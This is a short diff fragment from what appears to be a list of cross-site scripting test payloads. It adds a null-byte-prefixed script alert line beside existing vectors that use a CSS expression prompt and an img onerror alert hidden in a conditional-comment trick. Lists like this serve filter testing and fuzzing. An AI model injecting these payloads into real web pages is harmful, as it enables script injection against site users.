@@ -63,3 +63,5 @@ zzz<%div style=width:expression(prompt(933666))>
 
 <![<img src=a onerror=alert(/ololo/)//]-->
 
+qwe%00<script>alert(1)</script>
+
